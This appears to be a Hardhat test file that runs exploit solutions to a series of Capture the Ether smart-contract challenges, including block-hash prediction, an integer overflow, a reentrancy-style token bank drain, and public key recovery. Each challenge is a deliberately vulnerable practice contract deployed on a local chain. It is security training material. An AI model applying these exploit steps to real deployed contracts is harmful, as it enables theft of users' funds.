import { expect } from "chai";
import { ethers, waffle } from "hardhat";

describe("PredictTheFuture", function () {
  it("Solution", async function () {
    const challenge = await ethers.getContractFactory(
      "PredictTheFutureChallenge"
    );
    const deployedChallenge = await challenge.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory(
      "PredictTheFutureSolution"
    );
    const deployedSolution = await solution.deploy(deployedChallenge.address, {
      value: ethers.utils.parseEther("1"),
    });
    await deployedSolution.deployed();

    console.log(
      `Contract deployed finished:${await ethers.provider.getBlockNumber()}`
    );
    await ethers.provider.send("evm_mine", []);

    expect(
      await waffle.provider.getBalance(deployedChallenge.address)
    ).to.equal(ethers.utils.parseEther("2"));

    let done = false;
    let iterations = 0;
    while (!done) {
      const settleTransaction = await deployedSolution.settle();
      await settleTransaction.wait();
      if (await deployedSolution.solved()) {
        done = true;
        break;
      }

      if (iterations >= 100) {
        break;
      }

      console.log(
        `Current block number ${await ethers.provider.getBlockNumber()}`
      );

      iterations += 1;
    }

    console.log(`Finished after ${iterations} transactions`);
    expect(await deployedChallenge.isComplete()).to.equal(true);
    expect(
      await waffle.provider.getBalance(deployedChallenge.address)
    ).to.equal(ethers.utils.parseEther("0"));
    expect(await waffle.provider.getBalance(deployedSolution.address)).to.equal(
      ethers.utils.parseEther("0")
    );
  });
});

describe("PredictTheBlockHash", function () {
  it("Solution", async function () {
    const challenge = await ethers.getContractFactory(
      "PredictTheBlockHashChallenge"
    );
    const deployedChallenge = await challenge.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory(
      "PredictTheBlockHashSolution"
    );
    const deployedSolution = await solution.deploy(deployedChallenge.address, {
      value: ethers.utils.parseEther("1"),
    });
    await deployedSolution.deployed();

    expect(
      await waffle.provider.getBalance(deployedChallenge.address)
    ).to.equal(ethers.utils.parseEther("2"));
    console.log(
      `Contract deployed finished:${await ethers.provider.getBlockNumber()}`
    );

    for (let count = 0; count < 258; count++) {
      await ethers.provider.send("evm_mine", []);
    }

    console.log(
      `Current block number ${await ethers.provider.getBlockNumber()}`
    );

    const settleTransaction = await deployedSolution.settle();
    await settleTransaction.wait();

    expect(await deployedChallenge.isComplete()).to.equal(true);
    expect(
      await waffle.provider.getBalance(deployedChallenge.address)
    ).to.equal(ethers.utils.parseEther("0"));
    expect(await waffle.provider.getBalance(deployedSolution.address)).to.equal(
      ethers.utils.parseEther("0")
    );
  });
});

describe("TokenSale", function () {
  it("Solution", async function () {
    const challenge = await ethers.getContractFactory("TokenSaleChallenge");
    const [owner] = await ethers.getSigners();
    const deployedChallenge = await challenge.deploy(owner.address, {
      value: ethers.utils.parseEther("1"),
    });
    await deployedChallenge.deployed();

    const overflowTest = await ethers.getContractFactory("OverflowTest");
    const deployedOverflowTest = await overflowTest.deploy();
    await deployedOverflowTest.deployed();

    const solution = await ethers.getContractFactory("TokenSaleSolution");
    const deployedSolution = await solution.deploy(
      deployedChallenge.address,
      await deployedOverflowTest.getFinalInput(),
      {
        value: await deployedOverflowTest.getFinalTokenCount(),
      }
    );
    await deployedSolution.deployed();
    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe("TokenWhale", function () {
  it("Solution", async function () {
    const challenge = await ethers.getContractFactory("TokenWhaleChallenge");
    const [owner] = await ethers.getSigners();
    const deployedChallenge = await challenge.deploy(owner.address);
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory("TokenWhaleSolution");
    const deployedSolution = await solution.deploy(deployedChallenge.address);
    await deployedSolution.deployed();

    // Step 1: Send 1000 from owner to decoy
    deployedChallenge.transfer(
      deployedSolution.address,
      ethers.BigNumber.from(1000)
    );

    // Step 2: Owner send 1000 from solution to challenge via delegation
    deployedChallenge.transferFrom(
      deployedSolution.address,
      deployedChallenge.address,
      ethers.BigNumber.from(1000)
    );

    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe("RetirementFund", function () {
  it("Solution", async function () {
    const challenge = await ethers.getContractFactory(
      "RetirementFundChallenge"
    );
    const [owner] = await ethers.getSigners();
    const deployedChallenge = await challenge.deploy(owner.address, {
      value: ethers.utils.parseEther("1"),
    });
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory("RetirementFundSolution");
    const deployedSolution = await solution.deploy(deployedChallenge.address, {
      value: ethers.utils.parseEther("1"),
    });
    await deployedSolution.deployed();

    const collectPenaltyTxn = await deployedChallenge.collectPenalty();
    await collectPenaltyTxn.wait();

    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe("Mapping", function () {
  it("Solution", async function () {
    const challenge = await ethers.getContractFactory("MappingChallenge");
    const deployedChallenge = await challenge.deploy();
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory("MappingSolution");
    const deployedSolution = await solution.deploy(deployedChallenge.address);
    await deployedSolution.deployed();

    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe("Donation", function () {
  it("Solution", async function () {
    const challenge = await ethers.getContractFactory("DonationChallenge");
    const deployedChallenge = await challenge.deploy({
      value: ethers.utils.parseEther("1"),
    });
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory("DonationSolution");
    const deployedSolution = await solution.deploy();
    await deployedSolution.deployed();

    const payableAmount = await deployedSolution.getPayableEtherAmount();
    // console.log(
    //   `Variables are: ${input}, ${payableAmount}, ${ethers.BigNumber.from(
    //     deployedSolution.address
    //   )}`
    // );

    const solveTxn = await deployedSolution.solve(deployedChallenge.address, {
      value: payableAmount,
    });
    await solveTxn.wait();

    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe("FiftyYears", function () {
  it("Solution", async function () {
    const [owner] = await ethers.getSigners();
    const challenge = await ethers.getContractFactory("FiftyYearsChallenge");
    const deployedChallenge = await challenge.deploy(owner.address, {
      value: ethers.utils.parseEther("1"),
    });
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory("FiftyYearsSolution");
    const deployedSolution = await solution.deploy();
    await deployedSolution.deployed();

    console.log("All deployed");
    const secondTimestamp = await deployedSolution.getInput();
    let index = ethers.BigNumber.from("1");
    const secondUpsertTxn = await deployedChallenge.upsert(
      index,
      secondTimestamp,
      {
        value: ethers.BigNumber.from("1"),
      }
    );
    await secondUpsertTxn.wait();

    const thirdTimestamp = ethers.BigNumber.from("0");
    index = index.add("1");
    const thirdUpsertTxn = await deployedChallenge.upsert(
      index,
      thirdTimestamp,
      {
        value: ethers.BigNumber.from("2"),
      }
    );
    await thirdUpsertTxn.wait();

    const solutionKillTxn = await deployedSolution.kill(
      deployedChallenge.address,
      {
        value: ethers.BigNumber.from("2"),
      }
    );
    await solutionKillTxn.wait();

    console.log(`Withdrawing`);
    const challengeWithdrawTxn = await deployedChallenge.withdraw(
      ethers.BigNumber.from("2")
    );
    await challengeWithdrawTxn.wait();

    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe.skip("FuzzyIdentity", function () {
  it("Solution", async function () {
    // Searching can take some time
    this.timeout(3600000);
    const challenge = await ethers.getContractFactory("FuzzyIdentityChallenge");
    const deployedChallenge = await challenge.deploy();
    await deployedChallenge.deployed();

    const deployer = await ethers.getContractFactory("FuzzyIdentityDeployer");
    const deployedDeployer = await deployer.deploy();
    await deployedDeployer.deployed();

    const solution = await ethers.getContractFactory("FuzzyIdentitySolution");

    let currSalt = ethers.BigNumber.from("0");
    const byteCodeHash = ethers.utils.keccak256(solution.bytecode);

    while (currSalt.lt(ethers.constants.MaxUint256)) {
      const saltHex = ethers.utils.hexZeroPad(
        ethers.utils.hexlify(currSalt),
        32
      );

      const address = ethers.utils.getCreate2Address(
        deployedDeployer.address,
        saltHex,
        byteCodeHash
      );

      if (address.toLowerCase().includes("badc0de")) {
        console.log(address, currSalt);
        break;
      }

      currSalt = currSalt.add(ethers.constants.One);
    }

    const deployTxn = await deployedDeployer.deploy(
      ethers.utils.hexZeroPad(ethers.utils.hexlify(currSalt), 32)
    );
    await deployTxn.wait();
    const solveTxn = await deployedDeployer.solve(deployedChallenge.address);
    await solveTxn.wait();
    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe("PublicKey", function () {
  it("Solution", async function () {
    const tx = {
      hash: "0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb",
      type: 0,
      accessList: null,
      blockHash:
        "0x487183cd9eed0970dab843c9ebd577e6af3e1eb7c9809d240c8735eab7cb43de",
      blockNumber: 3015083,
      transactionIndex: 7,
      confirmations: 9155098,
      from: "0x92b28647Ae1F3264661f72fb2eB9625A89D88A31",
      gasPrice: ethers.BigNumber.from("0x3b9aca00"),
      gasLimit: ethers.BigNumber.from("0x015f90"),
      to: "0x6B477781b0e68031109f21887e6B5afEAaEB002b",
      value: ethers.BigNumber.from("0x00"),
      nonce: 0,
      data: "0x5468616e6b732c206d616e21",
      r: "0xa5522718c0f95dde27f0827f55de836342ceda594d20458523dd71a539d52ad7",
      s: "0x5710e64311d481764b5ae8ca691b05d14054782c7d489f3511a7abf2f5078962",
      v: 41,
      creates: null,
      chainId: 3,
    };
    const expandedSig = {
      r: tx.r,
      s: tx.s,
      v: tx.v,
    };
    const signature = ethers.utils.joinSignature(expandedSig);
    const txData = {
      gasPrice: tx.gasPrice,
      gasLimit: tx.gasLimit,
      value: tx.value,
      nonce: tx.nonce,
      data: tx.data,
      chainId: tx.chainId,
      to: tx.to,
    };
    const rsTx = await ethers.utils.resolveProperties(txData);
    const raw = ethers.utils.serializeTransaction(rsTx); // returns RLP encoded tx
    const msgHash = ethers.utils.keccak256(raw); // as specified by ECDSA
    const msgBytes = ethers.utils.arrayify(msgHash); // create binary hash
    const recoveredPubKey = ethers.utils.recoverPublicKey(msgBytes, signature);
    // const recoveredAddress = ethers.utils.recoverAddress(msgBytes, signature);

    const challenge = await ethers.getContractFactory("PublicKeyChallenge");
    const deployedChallenge = await challenge.deploy();
    await deployedChallenge.deployed();

    console.log(`0x${recoveredPubKey.slice(4)}`);
    const authTxn = await deployedChallenge.authenticate(
      `0x${recoveredPubKey.slice(4)}`
    );
    await authTxn.wait();

    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe("AssumeOwnership", function () {
  it("Solution", async function () {
    const challenge = await ethers.getContractFactory(
      "AssumeOwnershipChallenge"
    );
    const deployedChallenge = await challenge.deploy();
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory("AssumeOwnershipSolution");
    const deployedSolution = await solution.deploy(deployedChallenge.address);
    await deployedSolution.deployed();

    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});

describe("TokenBank", function () {
  it("Solution", async function () {
    const [owner, player] = await ethers.getSigners();
    const challenge = await ethers.getContractFactory("TokenBankChallenge");
    const deployedChallenge = await challenge.deploy(player.address);
    await deployedChallenge.deployed();

    const solution = await ethers.getContractFactory("TokenBankSolution");
    const deployedSolution = await solution.deploy(
      deployedChallenge.address,
      await deployedChallenge.token()
    );
    await deployedSolution.deployed();

    // const token = await ethers.getContractFactory("SimpleERC223Token");
    // const deployedToken = token.attach(await deployedChallenge.token());
    const deployedToken = await ethers.getContractAt(
      "SimpleERC223Token",
      await deployedChallenge.token(),
      owner
    );

    const tokenAmount = ethers.BigNumber.from("10").pow("18").mul("500000");
    expect(await deployedChallenge.balanceOf(owner.address)).to.equal(
      tokenAmount
    );
    // 1. User withdraw from bank
    const playerWithdrawTxn = await deployedChallenge
      .connect(player)
      .withdraw(tokenAmount);
    await playerWithdrawTxn.wait();

    // 2. User sends to attacker contract
    const playerToAttackerTxn = await deployedToken
      .connect(player)
      .transfer2(deployedSolution.address, tokenAmount);
    await playerToAttackerTxn.wait();

    // 3. Attacker to bank
    const attackerToBankTxn = await deployedSolution.createBankLiability();
    await attackerToBankTxn.wait();

    // 4. Attacker withdraw from bank
    const attackerWithdrawTxn = await deployedSolution.solve();
    await attackerWithdrawTxn.wait();

    expect(await deployedChallenge.isComplete()).to.equal(true);
  });
});
